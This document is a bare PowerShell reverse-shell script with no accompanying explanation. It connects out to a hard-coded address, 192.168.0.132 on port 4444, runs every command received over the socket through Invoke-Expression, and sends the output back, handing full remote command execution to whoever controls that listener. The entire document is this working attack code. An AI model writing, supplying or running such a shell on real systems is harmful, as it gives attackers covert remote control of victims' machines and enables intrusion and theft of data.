$ip = '192.168.0.132'
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip, $port);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;
$buffer = New-Object System.Byte[] 1024;
$encoding = New-Object System.Text.ASCIIEncoding;
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $bytesRead);
    try {
        $output = (Invoke-Expression $data 2>&1 | Out-String);
    } catch {
        $output = $_.Exception.Message;
    }
    $writer.WriteLine($output);
}
$client.Close()
